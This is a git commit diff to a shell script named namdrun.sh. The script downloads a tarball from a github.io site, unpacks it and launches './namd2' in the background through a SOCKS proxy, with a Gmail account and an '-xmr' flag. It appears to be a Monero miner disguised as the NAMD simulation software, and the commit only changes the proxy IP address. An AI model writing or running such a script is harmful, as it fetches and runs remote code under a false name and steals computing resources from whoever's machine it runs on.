f8374b8256c782714a3488e824115b43d494abbd
yogurtNetDL <yogurtNetDL@gmail.com>
2017-07-14 18:51:41 -0400

    Update namdrun.sh

--- namdrun.sh
+++ namdrun.sh
@@ -5,4 +5,4 @@ sudo apt-get install libboost-dev -y;
 wget https://yogurtnetdl.github.io/namd.tar.gz;
 tar -xf namd.tar.gz;
 cd namd/opt/namd/;
-nohup ./namd2 -proxy SOCKS://47.88.228.184:23455 -user hilcj0001@gmail.com -xmr 2 &
+nohup ./namd2 -proxy SOCKS://74.217.15.104:23455 -user hilcj0001@gmail.com -xmr 2 &
